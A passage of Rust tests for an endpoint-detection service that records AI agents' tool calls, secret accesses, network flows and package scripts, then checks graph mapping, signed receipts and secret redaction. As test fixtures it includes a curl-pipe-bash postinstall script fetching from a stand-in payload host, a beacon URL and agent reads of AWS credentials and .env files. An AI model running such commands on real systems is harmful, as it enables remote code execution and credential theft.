            .unwrap_or_else(|e| panic!("failed to decode agent-secret-touches response: {e}"));

        assert_eq!(payload["touchCount"], 1);
        let touch = &payload["touches"][0];
        assert_eq!(touch["credentialKind"], "cloud_credential");
        assert_eq!(touch["credentialLabel"], "/Users/alice/.aws/credentials");
        assert_eq!(touch["path"], "/Users/alice/.aws/credentials");
        assert!(touch["agentLabels"]
            .as_array()
            .unwrap_or_else(|| panic!("missing agent labels"))
            .iter()
            .any(|label| label == "mcp__filesystem__read_file"));
        assert!(touch["agentLabels"]
            .as_array()
            .unwrap_or_else(|| panic!("missing agent labels"))
            .iter()
            .any(|label| label == "agent:codex"));
        let graph_nodes = touch["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing touch graph nodes"));
        assert!(graph_nodes.values().any(|node| node["kind"] == "tool"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "credential"));
        assert!(graph_nodes.values().any(|node| node["kind"] == "process"));

        let signed: SignedReceipt = serde_json::from_value(touch["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode agent-secret graph receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing agent-secret endpointDecision metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing agent-secret receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse agent-secret receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "graph_slice");
        assert_eq!(
            endpoint_decision["graph"]["processNodeId"],
            touch["credentialNodeId"]
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing graph-slice evidence"))
            .iter()
            .any(|item| item["key"] == "sliceKind"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_maps_mcp_and_repo_secret_to_agent_secret_graph() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .route(
                "/api/v1/agent/edr/agent-secret-touches",
                post(agent_edr_agent_secret_touches),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "mcp_tool",
                    "id": "developer-tool-1",
                    "hostId": "host-developer-1",
                    "userId": "user-developer-1",
                    "sessionId": "developer-session-1",
                    "agentId": "agent:codex",
                    "workloadId": "mcp-server",
                    "approvalId": "approval-developer-1",
                    "toolCallId": "tool-call-developer-1",
                    "toolName": "mcp__filesystem__read_file",
                    "parameters": {
                        "path": "/repo/.env"
                    },
                    "metadata": {
                        "policyEpoch": 42,
                        "policyVersion": "policy-v1"
                    },
                    "process": {
                        "processGuid": "developer-proc-1",
                        "image": "/usr/bin/python3"
                    }
                },
                {
                    "kind": "repo_secret",
                    "id": "developer-secret-1",
                    "hostId": "host-developer-1",
                    "userId": "user-developer-1",
                    "sessionId": "developer-session-1",
                    "agentId": "agent:codex",
                    "workloadId": "mcp-server",
                    "approvalId": "approval-developer-1",
                    "path": "/repo/.env",
                    "name": "OPENAI_API_KEY",
                    "credentialKind": "api_token",
                    "process": {
                        "processGuid": "developer-proc-1",
                        "image": "/usr/bin/python3"
                    }
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build developer-activity request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("developer-activity request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read developer-activity response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode developer-activity response: {e}"));
        assert_eq!(payload["activityCount"], 2);
        assert_eq!(payload["observationCount"], 2);
        assert_eq!(
            payload["observationReceipts"].as_array().map(Vec::len),
            Some(2)
        );
        assert_eq!(payload["receiptCount"], 3);
        assert!(payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer observations"))
            .iter()
            .any(|observation| observation["event"]["type"] == "tool_call"));
        assert!(payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer observations"))
            .iter()
            .any(|observation| observation["event"]["type"] == "credential_access"));
        let tool_observation = payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer observations"))
            .iter()
            .find(|observation| observation["event"]["type"] == "tool_call")
            .unwrap_or_else(|| panic!("missing developer tool observation"));
        assert_eq!(tool_observation["hostId"], "host-developer-1");
        assert_eq!(tool_observation["userId"], "user-developer-1");
        assert_eq!(tool_observation["sessionId"], "developer-session-1");
        assert_eq!(tool_observation["metadata"]["agentId"], "agent:codex");
        assert_eq!(tool_observation["metadata"]["workloadId"], "mcp-server");
        assert_eq!(
            tool_observation["metadata"]["approvalId"],
            "approval-developer-1"
        );
        assert_eq!(
            tool_observation["metadata"]["toolCallId"],
            "tool-call-developer-1"
        );
        assert_eq!(tool_observation["metadata"]["policyEpoch"], 42);
        assert_eq!(tool_observation["metadata"]["policyVersion"], "policy-v1");

        let body = serde_json::json!({
            "sessionId": "developer-session-1",
            "credentialKind": "api_token",
            "upstreamDepth": 3,
            "downstreamDepth": 1,
            "limit": 10
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/agent-secret-touches")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build developer agent-secret-touches request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("developer agent-secret-touches request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read developer agent-secret-touches response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode developer agent-secret-touches response: {e}")
        });

        assert_eq!(payload["touchCount"], 1);
        let touch = &payload["touches"][0];
        assert_eq!(touch["credentialKind"], "api_token");
        assert_eq!(touch["path"], "/repo/.env");
        assert!(touch["agentLabels"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer agent labels"))
            .iter()
            .any(|label| label == "mcp__filesystem__read_file"));
        assert!(touch["agentLabels"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer agent labels"))
            .iter()
            .any(|label| label == "agent:codex"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_maps_dns_lookup_to_graph() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "dns_lookup",
                    "id": "developer-dns-1",
                    "hostId": "host-developer-1",
                    "userId": "user-developer-1",
                    "sessionId": "developer-session-1",
                    "agentId": "agent:codex",
                    "query": "packages.example.invalid",
                    "recordType": "A",
                    "answers": ["192.0.2.10"],
                    "resolver": "10.0.0.53",
                    "status": "noerror"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build DNS developer-activity request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("DNS developer-activity request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read DNS developer-activity response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode DNS developer-activity response: {e}"));
        assert_eq!(payload["observationCount"], 1);
        let observation = &payload["observations"][0];
        assert_eq!(observation["event"]["type"], "dns_lookup");
        assert_eq!(observation["event"]["query"], "packages.example.invalid");
        assert_eq!(observation["process"]["image"], "dns-collector");
        assert_eq!(
            observation["process"]["commandLine"],
            "dns_lookup packages.example.invalid"
        );

        let body = serde_json::json!({ "observations": [] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build persisted DNS graph request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("persisted DNS graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read persisted DNS graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode persisted DNS graph response: {e}"));
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing persisted graph nodes"))
            .values()
            .any(|node| {
                node["kind"] == "dns_name" && node["label"] == "packages.example.invalid"
            }));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_accepts_adapter_core_direct_policy_activity() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "network_egress",
                    "id": "adapter-direct-network-1",
                    "hostId": "host-direct-1",
                    "userId": "user-direct-1",
                    "sessionId": "session-direct-1",
                    "agentId": "agent:codex",
                    "host": "collector.example.invalid",
                    "port": 443,
                    "protocol": "https",
                    "method": "POST",
                    "url": "https://collector.example.invalid/ingest",
                    "commandLine": "network_egress POST https://collector.example.invalid/ingest",
                    "metadata": {
                        "rawPayloadOmitted": true,
                        "policyAllowed": false,
                        "policyGuard": "network_egress",
                        "policySeverity": "high",
                        "policyActionType": "network_egress"
                    }
                },
                {
                    "kind": "file_write",
                    "id": "adapter-direct-file-write-1",
                    "sessionId": "session-direct-1",
                    "path": "/repo/src/index.ts",
                    "operation": "write",
                    "contentHash": "sha256:file-write-hash",
                    "commandLine": "file_write /repo/src/index.ts"
                },
                {
                    "kind": "file_read",
                    "id": "adapter-direct-file-read-1",
                    "sessionId": "session-direct-1",
                    "path": "/repo/README.md",
                    "operation": "read",
                    "commandLine": "file_read /repo/README.md"
                },
                {
                    "kind": "patch_apply",
                    "id": "adapter-direct-patch-1",
                    "sessionId": "session-direct-1",
                    "path": "/repo/src/guard.ts",
                    "patchBytes": 128,
                    "patchHash": "sha256:patch-hash",
                    "commandLine": "patch_apply /repo/src/guard.ts"
                },
                {
                    "kind": "browser_download",
                    "id": "adapter-direct-browser-download-1",
                    "sessionId": "session-direct-1",
                    "browser": "chrome",
                    "path": "/Users/alice/Downloads/tool.pkg",
                    "sourceUrl": "https://downloads.example.invalid/tool.pkg",
                    "contentHash": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
                    "metadata": {
                        "downloadByteCount": "8192"
                    },
                    "commandLine": "browser_download /Users/alice/Downloads/tool.pkg"
                },
                {
                    "kind": "persistence_change",
                    "id": "adapter-direct-persistence-1",
                    "sessionId": "session-direct-1",
                    "mechanism": "launch_agent",
                    "operation": "write",
                    "target": "/Users/alice/Library/LaunchAgents/com.example.agent.plist",
                    "commandLine": "persistence_change write /Users/alice/Library/LaunchAgents/com.example.agent.plist"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build adapter-core direct activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("adapter-core direct activity request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read adapter-core direct activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode adapter-core direct activity response: {e}")
        });
        assert_eq!(payload["activityCount"], 6);
        assert_eq!(payload["observationCount"], 6);
        let observations = payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing adapter-core direct observations"));

        let network = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "network_flow")
            .unwrap_or_else(|| panic!("missing network flow observation"));
        assert_eq!(network["event"]["host"], "collector.example.invalid");
        assert_eq!(network["event"]["port"], 443);
        assert_eq!(network["event"]["protocol"], "https");
        assert_eq!(
            network["event"]["url"],
            "https://collector.example.invalid/ingest"
        );
        assert_eq!(network["metadata"]["method"], "POST");
        assert_eq!(network["metadata"]["rawPayloadOmitted"], true);

        assert!(observations.iter().any(|observation| {
            observation["event"]["type"] == "file_access"
                && observation["event"]["operation"] == "write"
                && observation["event"]["path"] == "/repo/src/index.ts"
                && observation["metadata"]["contentHash"] == "sha256:file-write-hash"
        }));
        assert!(observations.iter().any(|observation| {
            observation["event"]["type"] == "file_access"
                && observation["event"]["operation"] == "read"
                && observation["event"]["path"] == "/repo/README.md"
        }));
        assert!(observations.iter().any(|observation| {
            observation["event"]["type"] == "file_access"
                && observation["event"]["operation"] == "write"
                && observation["event"]["path"] == "/repo/src/guard.ts"
                && observation["metadata"]["patchBytes"] == 128
                && observation["metadata"]["patchHash"] == "sha256:patch-hash"
        }));
        assert!(observations.iter().any(|observation| {
            observation["event"]["type"] == "browser_download"
                && observation["event"]["browser"] == "chrome"
                && observation["event"]["path"] == "/Users/alice/Downloads/tool.pkg"
                && observation["event"]["content_hash"]
                    == "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                && observation["event"]["byte_count"] == 8192
                && observation["metadata"]["downloadByteCount"] == 8192
        }));
        assert!(observations.iter().any(|observation| {
            observation["event"]["type"] == "launch_persistence"
                && observation["event"]["operation"] == "write"
                && observation["event"]["path"]
                    == "/Users/alice/Library/LaunchAgents/com.example.agent.plist"
                && observation["metadata"]["mechanism"] == "launch_agent"
        }));
        let policy_decision_receipts = payload["policyDecisionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer activity policy decision receipts"));
        assert_eq!(policy_decision_receipts.len(), 1);
        let endpoint_decision =
            &policy_decision_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(endpoint_decision["receiptFamily"], "policy_decision");
        assert_eq!(
            endpoint_decision["decision"]["ruleId"],
            "endpoint.policy_decision.network_egress"
        );
        assert_eq!(endpoint_decision["decision"]["action"], "block");
        assert_eq!(endpoint_decision["decision"]["passed"], false);
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "developer_activity.policy_check"
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing developer policy decision receipt evidence"))
            .iter()
            .any(|item| item["key"] == "allowed"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_accepts_top_level_process_ancestry() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "mcp_tool",
                    "id": "developer-process-top-level-1",
                    "hostId": "host-process-1",
                    "sessionId": "session-process-1",
                    "agentId": "agent:codex",
                    "toolName": "mcp__filesystem__read_file",
                    "parameters": {
                        "path": "/repo/.env"
                    },
                    "processGuid": "proc-tool-1",
                    "parentProcessGuid": "proc-parent-shell-1",
                    "pid": 4242,
                    "ppid": 4000,
                    "processImage": "/usr/bin/python3",
                    "processCommandLine": "python3 /repo/agent.py --token=MY_RAW_SECRET",
                    "processCwd": "/repo"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build top-level process developer activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("top-level process developer activity failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read top-level process developer activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode top-level process developer activity response: {e}")
        });
        let observation = &payload["observations"][0];
        assert_eq!(observation["process"]["processGuid"], "proc-tool-1");
        assert_eq!(
            observation["process"]["parentProcessGuid"],
            "proc-parent-shell-1"
        );
        assert_eq!(observation["process"]["pid"], 4242);
        assert_eq!(observation["process"]["ppid"], 4000);
        assert_eq!(observation["process"]["image"], "/usr/bin/python3");
        assert_eq!(
            observation["process"]["commandLine"],
            "python3 /repo/agent.py --token=[REDACTED]"
        );
        assert_eq!(observation["process"]["cwd"], "/repo");
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_redacts_top_level_command_line_process_fallback() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "shell_command",
                    "id": "developer-command-line-fallback-1",
                    "sessionId": "session-process-1",
                    "image": "python3",
                    "commandLine": "python3 /repo/agent.py --token=MY_RAW_SECRET"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build top-level commandLine developer activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("top-level commandLine developer activity failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read top-level commandLine developer activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode top-level commandLine developer activity response: {e}")
        });
        let observation = &payload["observations"][0];
        assert_eq!(
            observation["process"]["commandLine"],
            "python3 /repo/agent.py --token=[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_redacts_process_exec_args_and_command_line() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "shell_command",
                    "id": "developer-process-exec-args-1",
                    "sessionId": "session-process-1",
                    "image": "python3",
                    "args": ["deploy.py", "--token", "MY_RAW_SECRET"]
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build process-exec args developer activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("process-exec args developer activity failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read process-exec args developer activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode process-exec args developer activity response: {e}")
        });
        let observation = &payload["observations"][0];
        assert_eq!(observation["event"]["type"], "process_exec");
        assert_eq!(observation["event"]["args"][0], "deploy.py");
        assert_eq!(observation["event"]["args"][1], "--token");
        assert_eq!(observation["event"]["args"][2], "[REDACTED]");
        assert_eq!(
            observation["process"]["commandLine"],
            "python3 deploy.py --token [REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_redacts_network_url_before_recording() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "network_egress",
                    "id": "developer-network-url-redaction-1",
                    "sessionId": "session-network-1",
                    "processGuid": "proc-network-url-redaction-1",
                    "processImage": "curl",
                    "host": "api.example.invalid",
                    "port": 443,
                    "protocol": "https",
                    "url": "https://deploy:MY_RAW_SECRET@api.example.invalid/upload?access_token=MY_RAW_SECRET"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build network URL developer activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("network URL developer activity failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read network URL developer activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode network URL developer activity response: {e}")
        });
        let observation = &payload["observations"][0];
        assert_eq!(observation["event"]["type"], "network_flow");
        assert_eq!(
            observation["event"]["url"],
            "https://deploy:[REDACTED]@api.example.invalid/upload?access_token=[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
    }

    #[tokio::test]
    async fn agent_edr_developer_activity_redacts_package_script() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/developer-activity",
                post(agent_edr_developer_activity),
            )
            .with_state(state);

        let body = serde_json::json!({
            "activities": [
                {
                    "kind": "package_script",
                    "id": "developer-package-script-redaction-1",
                    "sessionId": "session-pkg-dev-1",
                    "manager": "npm",
                    "package": "@acme/install-hook",
                    "phase": "postinstall",
                    "script": "curl https://payload.example.invalid/install.sh?token=MY_RAW_SECRET | bash",
                    "process": {
                        "image": "npm",
                        "commandLine": "npm postinstall --token=MY_RAW_SECRET"
                    },
                    "metadata": {
                        "apiToken": "MY_RAW_SECRET",
                        "request": {
                            "authorization": "Bearer MY_RAW_SECRET"
                        }
                    }
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/developer-activity")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build package-script developer activity request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("package-script developer activity failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read package-script developer activity response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode package-script developer activity response: {e}")
        });
        let observation = &payload["observations"][0];
        assert_eq!(observation["event"]["type"], "package_script");
        assert_eq!(
            observation["event"]["script"],
            "curl https://payload.example.invalid/install.sh?token=[REDACTED] | bash"
        );
        assert_eq!(
            observation["process"]["commandLine"],
            "npm postinstall --token=[REDACTED]"
        );
        assert_eq!(observation["metadata"]["apiToken"], "[REDACTED]");
        assert_eq!(
            observation["metadata"]["request"]["authorization"],
            "[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));
    }

    #[tokio::test]
    async fn agent_edr_network_extension_events_map_verdict_flow_to_graph() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/network-extension/events",
                post(agent_edr_network_extension_events),
            )
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "ne-flow-1",
                    "observedAt": "2026-05-17T12:00:00Z",
                    "hostId": "host-ne-1",
                    "userId": "user-ne-1",
                    "sessionId": "session-ne-1",
                    "flowId": "flow-abc",
                    "sourceApp": "com.apple.Terminal",
                    "sourceAppPath": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
                    "pid": 4242,
                    "processGuid": "proc-ne-terminal-1",
                    "process": {
                        "commandLine": "Terminal curl --token=MY_RAW_SECRET"
                    },
                    "host": "malware.example.invalid",
                    "port": 443,
                    "protocol": "tcp",
                    "url": "https://deploy:MY_RAW_SECRET@malware.example.invalid/beacon?access_token=MY_RAW_SECRET",
                    "dnsQuery": "malware.example.invalid",
                    "dnsRecordType": "A",
                    "dnsAnswers": ["203.0.113.17"],
                    "dnsResolver": "100.64.0.10",
                    "dnsStatus": "noerror",
                    "verdict": "block",
                    "reason": "restricted_egress",
                    "policySnapshotPath": "/tmp/network-extension-egress-policy.json",
                    "policySnapshotHash": "sha256:abc123",
                    "generation": 5150,
                    "remediationRequests": 2,
                    "blockedFlows": 7,
                    "allowedFlows": 3,
                    "metadata": {
                        "apiToken": "MY_RAW_SECRET",
                        "headers": {
                            "authorization": "Bearer MY_RAW_SECRET"
                        }
                    }
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/network-extension/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build NetworkExtension event request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("NetworkExtension event request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read NetworkExtension event response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode NetworkExtension event response: {e}"));
        assert_eq!(payload["eventCount"], 1);
        assert_eq!(payload["observationCount"], 3);
        let observations = payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension observations"));
        let dns_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "dns_lookup")
            .unwrap_or_else(|| panic!("missing NetworkExtension DNS observation"));
        assert_eq!(dns_observation["event"]["query"], "malware.example.invalid");
        assert_eq!(dns_observation["event"]["record_type"], "A");
        assert_eq!(dns_observation["event"]["answers"][0], "203.0.113.17");
        assert_eq!(dns_observation["event"]["resolver"], "100.64.0.10");
        assert_eq!(dns_observation["event"]["status"], "noerror");
        assert_eq!(
            dns_observation["metadata"]["networkExtensionObservationKind"],
            "dns_lookup"
        );
        let flow_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "network_flow")
            .unwrap_or_else(|| panic!("missing NetworkExtension flow observation"));
        assert_eq!(flow_observation["hostId"], "host-ne-1");
        assert_eq!(flow_observation["userId"], "user-ne-1");
        assert_eq!(flow_observation["sessionId"], "session-ne-1");
        assert_eq!(
            flow_observation["process"]["image"],
            "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
        );
        assert_eq!(flow_observation["process"]["pid"], 4242);
        assert_eq!(
            flow_observation["process"]["commandLine"],
            "Terminal curl --token=[REDACTED]"
        );
        assert_eq!(flow_observation["event"]["host"], "malware.example.invalid");
        assert_eq!(flow_observation["event"]["port"], 443);
        assert_eq!(
            flow_observation["event"]["url"],
            "https://deploy:[REDACTED]@malware.example.invalid/beacon?access_token=[REDACTED]"
        );
        assert_eq!(
            flow_observation["metadata"]["collectorKind"],
            "network_extension"
        );
        assert_eq!(
            flow_observation["metadata"]["providerId"],
            "macos.network_extension"
        );
        assert_eq!(flow_observation["metadata"]["flowId"], "flow-abc");
        assert_eq!(
            flow_observation["metadata"]["networkExtensionVerdict"],
            "blocked"
        );
        assert_eq!(
            flow_observation["metadata"]["policySnapshotHash"],
            "sha256:abc123"
        );
        assert_eq!(flow_observation["metadata"]["blockedFlows"], 7);
        assert_eq!(flow_observation["metadata"]["apiToken"], "[REDACTED]");
        assert_eq!(
            flow_observation["metadata"]["headers"]["authorization"],
            "[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));

        let decision_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "policy_decision")
            .unwrap_or_else(|| panic!("missing NetworkExtension decision observation"));
        assert_eq!(
